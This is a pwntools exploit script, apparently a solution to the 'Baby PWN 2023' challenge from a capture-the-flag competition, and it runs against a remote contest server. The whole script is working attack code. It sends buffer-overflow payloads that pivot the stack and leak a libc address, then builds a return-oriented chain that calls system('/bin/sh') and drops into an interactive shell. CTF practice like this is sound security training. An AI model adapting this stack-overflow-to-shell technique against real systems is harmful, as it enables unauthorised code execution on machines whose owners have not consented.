#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./chall')
p=remote("babypwn2023.balsnctf.com",10105)
e=ELF('./chall')
libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

gets=e.symbols['gets']
puts=e.symbols['puts']

gadget=0x00000000004010e7
poprbp=0x000000000040115d
gadget2=0x000000000040114c

padding=b'a'*0x20+p64(0x404c30)

payload=padding+p64(0x4011a0)
sl(payload)

padding=b'a'*0x18+p64(e.symbols['main'])+p64(0x404c30)
payload=padding+p64(gadget2)+p64(0x404c30)+p64(0x4011B8)+p64(0x404c30)+p64(e.sym['main'])
sl(payload)
ru('Baby PWN 2023 :)\n')

libcbase=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x21a780
# libc.address=libcbase
log.info("libc"+str(hex(libcbase)))

system=libcbase+libc.sym['system']
binsh=libcbase+next(libc.search(b"/bin/sh"))
poprdi=libcbase+next(libc.search(asm("pop rdi\nret")))
payload=padding+p64(poprdi)+p64(binsh)+p64(system)

sl(payload)

p.interactive()
